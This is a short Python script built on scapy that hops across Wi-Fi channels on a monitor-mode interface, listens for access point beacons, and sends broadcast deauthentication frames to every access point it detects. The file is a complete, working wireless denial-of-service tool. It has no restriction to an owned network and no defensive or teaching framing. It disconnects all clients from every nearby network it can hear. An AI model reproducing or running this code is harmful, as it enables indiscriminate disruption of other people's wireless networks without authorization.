import threading, os, time, random
from scapy.all import *
from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth

interface = "wlp0s20f0u1mon"

def hopper(iface):
    n = 1
    stop_hopper = False
    while not stop_hopper:
        time.sleep(0.50)
        os.system('iwconfig %s channel %d' % (iface, n))
        dig = int(random.random() * 14)
        if dig != 0 and dig != n:
            n = dig

F_bssids = []    # Found BSSIDs
def findSSID(pkt):
    data = ""
    #pkt.show()
    if (pkt.haslayer(Dot11Beacon)):
        #if(pkt.getlayer(Dot11).addr2 not in F_bssids):
        F_bssids.append(pkt.getlayer(Dot11).addr2)
        mac_addr = pkt.getlayer(Dot11).addr2
        ssid = pkt.getlayer(Dot11Elt).info
        if(ssid == '' or pkt.getlayer(Dot11Elt).ID != 0):
            print("Hidden Network Detected")
        print("Network Detected: %s - %s" % (ssid.decode('utf-8'), mac_addr))
        deauth(mac_addr, "FF:FF:FF:FF:FF:FF")

def deauth(ap, client):
    # Deauthentication Packet For Access Point
    pkt = RadioTap()/Dot11(addr1=client, addr2=ap, addr3=ap)/Dot11Deauth()
    sendp(pkt, iface=interface)
    print("Deauth to: %s" %(ap))


if __name__ == "__main__":
    #pket = RadioTap()/Dot11(addr1="FF:FF:FF:FF:FF:FF", addr2="62:F4:51:7E:C3:3C", addr3="62:F4:51:7E:C3:3C")/Dot11Deauth(reason=2)
    #sendp(pket, iface=interface, verbose=False)
    thread = threading.Thread(target=hopper, args=(interface, ), name="hopper")
    thread.daemon = True
    thread.start()

    sniff(iface=interface, prn=findSSID)
